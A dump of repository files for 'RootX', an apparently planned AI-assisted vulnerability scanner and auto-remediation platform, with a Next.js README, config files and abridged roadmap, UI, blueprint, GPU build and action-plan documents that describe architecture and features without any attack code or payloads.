<!-- END:nextjs-agent-rules -->
```

## 📁 `frontend/README.md`

```md
This is a [Next.js](https://nextjs.org) project bootstrapped with [`create-next-app`](https://nextjs.org/docs/app/api-reference/cli/create-next-app).

## Getting Started

First, run the development server:

\`\`\`bash
npm run dev
# or
yarn dev
# or
pnpm dev
# or
bun dev
\`\`\`

Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.

You can start editing the page by modifying `app/page.tsx`. The page auto-updates as you edit the file.

This project uses [`next/font`](https://nextjs.org/docs/app/building-your-application/optimizing/fonts) to automatically optimize and load [Geist](https://vercel.com/font), a new font family for Vercel.

## Learn More

To learn more about Next.js, take a look at the following resources:

- [Next.js Documentation](https://nextjs.org/docs) - learn about Next.js features and API.
- [Learn Next.js](https://nextjs.org/learn) - an interactive Next.js tutorial.

You can check out [the Next.js GitHub repository](https://github.com/vercel/next.js) - your feedback and contributions are welcome!

## Deploy on Vercel

The easiest way to deploy your Next.js app is to use the [Vercel Platform](https://vercel.com/new?utm_medium=default-template&filter=next.js&utm_source=create-next-app&utm_campaign=create-next-app-readme) from the creators of Next.js.

Check out our [Next.js deployment documentation](https://nextjs.org/docs/app/building-your-application/deploying) for more details.
```

## 📁 `.gitignore`

```
node_modules/
.next/
.env
.env.local
*.log
```

## 📁 `package.json`

```json
{
  \"devDependencies\": {
    \"autoprefixer\": \"^10.5.0\",
    \"postcss\": \"^8.5.15\",
    \"tailwindcss\": \"^4.3.0\"
  }
}
```

---

## 📁 `RootX All Md files/ROOTX_VISION_ROADMAP.md`

```md
# RootX: Next-Generation Hybrid Pentesting Platform
## Strategic Architecture & Implementation Roadmap

RootX is designed to be a fast, practical, and highly accurate penetration testing platform. By combining lightweight rules with targeted AI analysis, RootX minimizes false positives and generates validated Proof-of-Concepts (PoCs) alongside automated code patches.

---

## Technical Architecture Overview

To achieve higher efficiency and lower costs than monolithic AI models, RootX uses a three-tier architecture:

\`\`\`
[ Target URL / Repository ]
           │
           ▼
┌──────────────────────────────────────┐
│  Tier 1: Speed Engine (Node.js)     │  <-- Fast, low cost (SSL, headers, ports)
└──────────────────┬───────────────────┘
                   │
                   ▼ (Potential Vulns Discovered)
┌──────────────────────────────────────┐
│  Tier 2: AI Verification Engine      │  <-- LLM APIs (Gemini/Claude) inspect context,
└──────────────────┬───────────────────┘      construct payloads, filter false positives.
                   │
                   ▼ (Safe Payloads)
┌──────────────────────────────────────┐
│  Tier 3: Exploit Validation Sandbox  │  <-- Execute payload safely. Confirm exploit.
└──────────────────┬───────────────────┘
                   │
                   ▼
┌──────────────────────────────────────┐
│  Autopilot: Pull Request / Patch     │  <-- Generate and deliver the code patch.
└──────────────────────────────────────┘
\`\`\`

---

## Phase-by-Phase Roadmap

### Phase 1: Engine Accuracy & False-Positive Elimination
*   **Contextual Validation:** Refactor modules to inspect response content-types (e.g., rejecting \`text/html\` for \`.env\` files) and match specific signatures instead of trusting \`200 OK\` responses blindly.
*   **Heuristic Pre-flight Checks:** Establish baseline behaviors for target websites to identify wildcard redirects before running probes.

### Phase 2: Targeted AI Verification & Sandbox Testing
*   **Verification Sandbox:** Build a safe, isolated execution utility to run checks against local or test environments.
*   **Payload Generator:** Connect to an LLM API to construct benign validation strings for targeted verification.

### Phase 3: Autopilot Remediation Integrations
*   **Remediation Engine:** Develop an automated patch generator.
*   **Git Integration:** Provide Git hooks or repository integration allowing RootX to open a Pull Request.

### Phase 4: Dashboard Overhaul
*   **Live Agent Terminal:** Visual component displaying real-time AI reasoning logs.
*   **PoC Viewer:** Detailed log view for verified vulnerabilities.
*   **Auto-Fix Button:** Quick-remediation interface for applying patches.

*(64 lines total — full document available at \`RootX All Md files/ROOTX_VISION_ROADMAP.md\`)*
```

## 📁 `RootX All Md files/ROOTX_MYTHOS_SPEC.md`

```md
# RootX-Mythos: Next-Generation Autonomous Cybersecurity Platform
## Technical Specification, Roadmap, and Rationale

This document details the vision for **RootX-Mythos**—a tool that combines fast, lightweight heuristic scanning (RootX) with autonomous, code-level reasoning and exploit generation (Mythos).

---

## 1. What Are We Actually Doing?

We are building a **Next-Gen Autonomous AI Cybersecurity Agent**.

Unlike standard scanners that just alert you with a text file saying *"You have a bug,"* RootX-Mythos acts as an **autonomous, self-correcting security engineer** that:
1. Analyzes the source code of an application (White-Box Audit).
2. Deploys targeted test payloads against the live application (Black-Box Exploitation).
3. **Proves** the vulnerability exists by showing a safe exploit proof.
4. Generates and merges the **code patch** directly into the code repository.

### The Tech Stack
* **Next.js (React + TypeScript):** Interactive security dashboard.
* **Node.js (Express + Socket.IO):** Orchestration backend.
* **LLM API (Gemini / Claude):** The "brain" of the agent.
* **Node VM / Sandbox Environment:** Isolated exploit testing space.

### How the RootX-Mythos Loop Works
\`\`\`
User inputs URL → 1. Heuristic Scan → 2. LLM Payload Generator
→ 3. Exploit Sandbox → 4. Auto-Patch Engine & Git PR
\`\`\`

### Implementation Roadmap
- **Phase 1:** High-Accuracy Foundation (Eliminating False Positives)
- **Phase 2:** White-Box Code Auditor
- **Phase 3:** Autonomous Exploit Engine & Sandbox
- **Phase 4:** Git Auto-Remediation (Autopilot)

*(80 lines total — full document at \`RootX All Md files/ROOTX_MYTHOS_SPEC.md\`)*
```

## 📁 `RootX All Md files/ROOTX_UI_DESIGN.md`

```md
# RootX — UI Design Specification
## Main Page & Dashboard — Detailed Layout

---

## OVERALL APP STRUCTURE

RootX has a **persistent left sidebar** and a **content area** that changes based on the selected page.

\`\`\`
┌────────────┬──────────────────────────────────────────────────────┐
│  SIDEBAR   │              CONTENT AREA                            │
│  Logo      │  (Changes based on selected sidebar item)            │
│  ────────  │                                                      │
│  💬 Chat   │  Page 1: AI Chat Agent (Main Page)                   │
│  📊 Monitor│  Page 2: Security Dashboard (Monitoring)             │
│  📜 History│  Page 3: Scan History                                │
│  ⚙️ Settings│  Page 4: API Keys, GitHub Token, Preferences        │
└────────────┴──────────────────────────────────────────────────────┘
\`\`\`

### Sidebar Details:
- **Width**: 240px (collapsible to 60px icon-only mode)
- **Background**: \`#080d1e\` (very dark navy)
- **Logo**: "ROOTX" in Orbitron font, color \`#00FF9C\`
- **Menu Items**: Icon + label, highlight active item with green left border

**Page 1** — AI Chat Agent (homepage); **Page 2** — Monitoring Dashboard (real-time stats, security score ring, shields chart); **Page 3** — Scan History (filterable/sortable table); **Page 4** — Settings (API keys, preferences).

*(311 lines total — full document at \`RootX All Md files/ROOTX_UI_DESIGN.md\`)*
```

## 📁 `RootX All Md files/ROOTX_MASTER_PLAN.md`

```md
# ROOTX — COMPLETE MASTER PLAN
# Everything in one file: Analysis → Plan → Attacks → Strategy

> **Created:** June 2026
> **Status:** Planning Complete — Build starts Monday
> **Vision:** The world'\''s first free tool combining Vulnerability Scanner + IDS/IPS + AI + Beautiful UI

## TABLE OF CONTENTS
1. PART 1: Codebase Analysis
2. PART 2: Implementation Plan (7 Months)
3. PART 3: All 113 Attacks in the World
4. PART 4: Attack Intelligence Database (75 Detailed Cards)
5. PART 5: Growth & Business Strategy

## PART 1: CODEBASE ANALYSIS

RootX is an **AI-powered cybersecurity platform** — a web-based vulnerability scanner. Built with:
| Layer | Tech | Location |
|---|---|---|
| Frontend | Next.js 16, React 19, TailwindCSS 4, Framer Motion | \`frontend/\` |
| Backend | Express 5, Socket.IO, Axios, Node TLS | \`backend/server.js\` |
| Database | Supabase (PostgreSQL) | \`frontend/lib/supabase.ts\` |
| Real-time | Socket.IO | \`frontend/lib/socket.ts\` |

### Current State
**✅ What Works:** Landing page, Dashboard, Backend scanner (SSL, headers, SQLi, XSS, sensitive files, admin panels, tech detect), Supabase integration, Socket.IO events.

**❌ What'\''s Broken/Incomplete:**
1. Two separate scan pipelines (Next.js API route vs Express backend)
2. Fake/mock terminal logs (not connected to real scan events)
3. Socket.IO wired but unused for scan progress
4. Activity Feed generates fake random events
5. ZAP integration is dead

## PART 2: 7-MONTH IMPLEMENTATION PLAN
*(Detailed month-by-month plan covering Engine, AI, Compliance, Scaling, Business)*

## PART 3: ALL 113 ATTACKS
*(Complete database of attack types across 12 categories)*

## PART 4: ATTACK INTELLIGENCE DATABASE
*(75 detailed attack cards with detection logic, risk scoring, and remediation)*

## PART 5: GROWTH & BUSINESS STRATEGY
*(Marketing, monetization, and competitive positioning)*

*(1007 lines total — full document at \`RootX All Md files/ROOTX_MASTER_PLAN.md\`)*
```

## 📁 `RootX All Md files/ROOTX_BLUEPRINT.md`

```md
# ROOTX — MASTER BLUEPRINT v1.0
# Autonomous AI-Powered Defensive Security Agent

## What is RootX?
RootX is an **Autonomous AI-Powered Defensive Security Agent**. It is NOT a simple vulnerability scanner. It is an intelligent system that:
- **Discovers** every page, form, API endpoint, and service on a target using dynamic crawling
- **Analyzes** source code from Git repositories to find logic flaws, hardcoded secrets, insecure queries
- **Verifies** potential vulnerabilities using safe, non-destructive validation to eliminate false positives
- **Fixes** confirmed issues automatically by generating code patches and opening Git Pull Requests
- **Reports** everything through a premium, real-time dashboard with live AI reasoning terminal

## The Problem RootX Solves
1. **Existing scanners produce massive false positives**
2. **Scanners only find problems, they don'\''t fix them**
3. **Static analysis tools don'\''t understand runtime behavior**
4. **Enterprise tools cost $50,000-$500,000/year**

## Tech Stack
| Component | Technology | Purpose |
|---|---|---|
| Frontend | Next.js 16 + React 19 + TailwindCSS 4 | Dashboard, Chat, Visualizations |
| Backend | Express 5 + Node.js + Socket.IO | Orchestration, API, WebSocket |
| Database | Supabase (PostgreSQL) | Scan history, user data |
| AI/LLM | Gemini, Claude, vLLM (AMD GPU) | Vulnerability analysis, code fixes |
| Sandbox | Node.js VM + Docker | Safe exploit validation |
| Git | Octokit (GitHub API) | Auto-fix PR creation |

## Feature Breakdown (12 Modules)
**Core Scanners:** Baseline, SSL/TLS, Headers, Cookies, CORS, SQLi, XSS, LFI/RFI, SSRF, Command Injection, XXE, LDAP
**AI Modules:** AI Agent, Code Auditor, Auto-Fix Engine, Exploit Validator
**Monitoring:** Live Shield, Attack Log, IP Blocking, Real-time Alerts
**Reporting:** PDF Reports, JSON Export, Severity Dashboards, Trend Analysis

*(590 lines total — full document at \`RootX All Md files/ROOTX_BLUEPRINT.md\`)*
```

## 📁 `RootX All Md files/ROOTX_AMD_BUILD_GUIDE.md`

```md
# RootX on AMD — Complete Setup & Build Guide
## From Zero to a Working AI Cybersecurity Agent on AMD GPU

## Understanding the Architecture
RootX is NOT an LLM itself. RootX is a PLATFORM that USES an LLM as its brain.
- LLM (CodeLlama/Mistral) = The brain (runs on AMD GPU via vLLM)
- RootX Backend (Express.js) = The body (orchestrates actions)
- RootX Frontend (Next.js) = The face (user interface)

## Step-by-Step Build Plan
### Step 1: Set Up AMD Developer Cloud GPU
- Access AMD Developer Cloud at https://www.amd.com/en/developer/resources/developer-cloud.html
- Provision MI300X/MI210 instance

### Step 2: Deploy the LLM on AMD GPU
- Install ROCm 6.0+, PyTorch, vLLM
- Run: \`python -m vllm.entrypoints.openai.api_server --model codellama/CodeLlama-13b-Instruct-hf --port 8000\`

### Step 3-8: Build Backend → Frontend → Code Auditor → Auto-Fix → Dashboard → Integration
### Step 9: Test & Demo Preparation
### Budget Breakdown: ~$10-15/day for AMD GPU cloud, ~$0 for open-source stack

*(590 lines total — full document at \`RootX All Md files/ROOTX_AMD_BUILD_GUIDE.md\`)*
```

## 📁 `RootX All Md files/ROOTX_ACTION_PLAN.md`

```md
# RootX — Pre-AMD Action Plan
## What to Fix, What to Add, and Z+ Self-Security Hardening

## PART 1: WHAT TO FIX (Current Bugs & Issues)

### Fix 1: False Positive Elimination (CRITICAL)
**Files**: \`backend/modules/sensitive-files.js\`, \`backend/modules/admin-panels.js\`
**The Problem**: RootX reports Instagram, Google, etc. as having exposed \`.env\` files — all false.
**The Fix**: Create baseline checker, check Content-Type, verify body contains actual login elements.

### Fix 2: Supabase Environment Variables
### Fix 3: \`window is not defined\` Error on /protected Page
### Fix 4: Backend Missing Dependencies (dotenv, axios)

## PART 2: WHAT TO ADD (New Features)
### Feature 1: Chat Interface (Main Page Replacement)
### Feature 2: Live Agent Terminal in Dashboard
### Feature 3: Enhanced Scan Results View
### Feature 4: AI Security Audit for Git Repos

## PART 3: ZERO-HOUR — Self Security Hardening
- CORS hardening, rate limiting, input validation, auth gates, error sanitization

## PART 4: COMMAND CHEAT SHEET & QUICK REFS
## PART 5: SCREENSHOT LIST (AMD Demo)

*(467 lines total — full document at \`RootX All Md files/ROOTX_ACTION_PLAN.md\`)*
```
